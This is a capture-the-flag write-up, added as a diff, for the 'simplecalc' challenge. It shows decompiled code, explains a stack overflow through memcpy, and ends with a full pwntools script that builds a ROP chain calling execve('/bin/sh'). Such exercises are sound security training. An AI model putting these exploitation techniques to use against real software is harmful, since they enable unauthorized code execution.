@@ -1,0 +1,166 @@
+=== Personal solution description ===
+
+Binary is 64-bit, using Ghidra to decompile it and then cleaning the main function results in:
+
+---------------------------------------------------------------------------------
+	undefined8 main(void)
+	{
+	  int vuln [10];
+	  int opt;
+	  int n;
+	  int *buf;
+	  int i;
+	  
+	  n = 0;
+	  setvbuf((FILE *)stdin,(char *)0x0,2,0);
+	  setvbuf((FILE *)stdout,(char *)0x0,2,0);
+	  print_motd();
+	  printf("Expected number of calculations: ");
+	  __isoc99_scanf(&DAT_00494214,&n);
+	  handle_newline();
+	  if ((n < 256) && (3 < n)) {
+		buf = (int *)malloc((long)(n << 2));
+		for (i = 0; i < n; i = i + 1) {
+		  print_menu();
+		  __isoc99_scanf(&DAT_00494214,&opt);
+		  handle_newline();
+		  if (opt == 1) {
+			adds();
+			buf[i] = add[2];
+		  }
+		  else if (opt == 2) {
+			subs();
+			buf[i] = sub[2];
+		  }
+		  else if (opt == 3) {
+			muls();
+			buf[i] = mul[2];
+		  }
+		  else if (opt == 4) {
+			divs();
+			buf[i] = divv[2];
+		  }
+		  else {
+			if (opt == 5) {
+			  memcpy(vuln,buf,(long)(n << 2));
+			  free(buf);
+			  return 0;
+			}
+			puts("Invalid option.\n");
+		  }
+		}
+		free(buf);
+	  }
+	  else {
+		puts("Invalid number.");
+	  }
+	  return 0;
+	}
+---------------------------------------------------------------------------------
+
+Notice what happens at option 5. It copies the buffer "buf", where calculations have been saved, into the stack, resulting in a buffer overflow. Sadly we can't jump to shellcode this time because our buffer will be full of calculation results, but perhaps we can jump to libc functions, as the binary is statically linked. Sadly though, there are no interesting functions packed with it. So instead we have to use ROP gadgets to execute an execve syscall.
+
+Firstly, according to Ghidra's disassembly pane, we need to fill up 0x48 + 0x8 (RBP) bytes. That is 0x50 / 4 = 20 (int) results. So we can just pad these with 0. In fact, it is important to pad them with 0 so when free(buf) is called in main, on option 5, it doesn't crash.
+
+Afterwards, let's find some gadgets:
+---------------------------------------------------------------------------------
+	pop_rax = 0x44db34        # pop rax; ret
+	pop_rsi = 0x401c87        # pop rsi; ret
+	pop_rdi = 0x401b73        # pop rdi; ret
+	pop_rdx = 0x437a85        # pop rdx; ret
+	syscall_gadget = 0x400488 # syscall
+	mov_gadget = 0x44526e     # mov qword ptr [rax], rdx ; ret
+---------------------------------------------------------------------------------
+
+So here's the plan:
+---------------------------------------------------------------------------------
+	pop rax, 0x6c1060   # some data region in the data region in Ghidra, to write /bin/sh to
+	pop rdx, 0x0068732f6e69622f  # /bin/sh in hex
+	mov qword ptr [rax], rdx # write /bin/sh to 0x6c1060
+	pop rax, 0x3b  # syscall no for execve
+	pop rdi, 0x6c1060   # filename to execute
+	pop rsi, 0     # no argv
+	pop rdx, 0     # no envp
+	syscall
+---------------------------------------------------------------------------------
+
+Since we're dealing with 64 bits and we can write 4 bytes per calculation, we need to ensure all the gadgets we found are padded with 4 bytes of 0 at the beginning of the address, on the stack.
+So instead of "pushing" a gadget address (for example 0x44db34) on the stack, we need to additionally push 0x0 to pad the address (so push 0x44db34 and 0x0).
+
+We then end up with an exploit similar to:
+---------------------------------------------------------------------------------
+	#!/usr/bin/env python3
+	from pwn import *
+
+	# ROP gadgets
+	pop_rax = 0x44db34        # pop rax; ret
+	pop_rsi = 0x401c87        # pop rsi; ret
+	pop_rdi = 0x401b73        # pop rdi; ret
+	pop_rdx = 0x437a85        # pop rdx; ret
+	syscall_gadget = 0x400488 # syscall
+	mov_gadget = 0x44526e     # mov qword ptr [rax], rdx ; ret
+
+	data_region_addr = 0x6c1060 # address found in data seg (w/ Ghidra)
+
+	target = process("./simplecalc")
+	target.recvuntil(b"Expected number of calculations: ")
+	target.send(b"255\n")
+
+	def send_add(x):
+		print(target.recvuntil(b"=> "))
+		target.send(b"1\n")
+		print(target.recvuntil(b"Integer x: "))
+		target.send(b"40\n")
+		print(target.recvuntil(b"Integer y: "))
+		target.send(bytes(str(x - 40), encoding="ASCII"))
+		target.send(b"\n")
+
+	def send_sub(x):
+		print(target.recvuntil(b"=> "))
+		target.send(b"2\n")
+		print(target.recvuntil(b"Integer x: "))
+		target.send(b"999999\n")
+		print(target.recvuntil(b"Integer y: "))
+		target.send(bytes(str(999999 - x), encoding="ASCII"))
+		target.send(b"\n")
+
+	# pads addresses on the stack with 0s, for 64 bits
+	def send_addr(rop, func):
+		func(rop)
+		func(0)
+
+	for _ in range(18):   # 0x48 = 18 * 4
+		send_add(0) # fill up the buffer with 0
+
+	send_addr(pop_rax, send_add)
+	send_addr(data_region_addr, send_add) # data seg address we will write /bin/sh to
+
+	send_addr(pop_rdx, send_add)
+	send_add(0x6e69622f)  # nib/    (/bin little endian in hex)
+	send_add(0x0068732f)  # 0hs/    (/sh0 little endian in hex)
+
+	send_addr(mov_gadget, send_add)
+
+	send_addr(pop_rax, send_add)
+	send_addr(0x3b, send_sub) # syscall no for execve 64-bit
+	# use sub to avoid program exit from small numbers
+
+	send_addr(pop_rdi, send_add)
+	send_addr(data_region_addr, send_add) # pointer to filename to execute (/bin/sh)
+
+	send_addr(pop_rsi, send_add) # argv
+	send_addr(0, send_add)
+
+	send_addr(pop_rdx, send_add) # envp
+	send_addr(0, send_add)
+
+	send_addr(syscall_gadget, send_add)
+
+	# terminate calculator
+	#gdb.attach(target)
+	target.send(b"5\n")
+
+	target.interactive()
+---------------------------------------------------------------------------------
+
+Running it will pop a shell. Success!
